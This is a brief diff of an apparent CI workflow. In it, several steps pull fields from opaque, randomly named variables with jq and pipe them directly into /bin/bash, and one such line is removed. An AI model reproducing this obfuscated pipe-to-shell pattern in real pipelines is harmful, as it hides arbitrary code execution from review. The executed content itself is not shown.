@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$ozerh80" | jq -r .thoml46039 | /bin/bash
           printf '%s' "$exen07506" | jq -r .cpw136 | /bin/bash
           printf '%s' "$putt84900" | jq -r .vakkm5107 | /bin/bash
-          printf '%s' "$jgns8" | jq -r .pbq30362 | /bin/bash
           echo $nlyf773 | jq -r .zjn9 | /bin/bash
 
       - name: Persist results
